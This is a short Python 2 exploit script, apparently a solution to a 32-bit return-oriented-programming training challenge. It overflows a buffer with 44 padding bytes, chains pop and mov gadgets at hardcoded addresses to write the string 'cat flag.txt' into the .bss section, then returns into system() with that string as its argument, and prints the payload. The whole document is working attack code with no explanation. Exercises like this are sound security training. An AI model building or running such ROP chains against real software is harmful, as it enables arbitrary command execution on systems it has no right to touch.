import struct 

def conv(x): 
    return struct.pack('<L', x) 

pop_gadget = 0x80486da #pop edi, pop ebp, ret 
mov_gadget = 0x8048670 #mov [edi],ebp; ret 

def write432(data, loc): 
    buf =  conv(pop_gadget) #fill the registers 
    buf += conv(loc) 
    buf += conv(data) 
    buf += conv(mov_gadget) #we'll return here 
    return buf  

def write(string, start): 
    buf = '' 
    chunks = [string[i:i+4] for i in range(0, len(string), 4)] 
    for x in range(len(chunks)): 
        address = start+x*4 
        buf += write432(struct.unpack('<L',chunks[x])[0], address) 
    return buf 

 

buf = 'A'*44 
buf += write('cat flag.txt',0x0804a040) #.bss data section 
buf += conv(0x08048430) #system address 
buf += 'AAAA' 
buf += conv(0x0804a040) 

print buf 
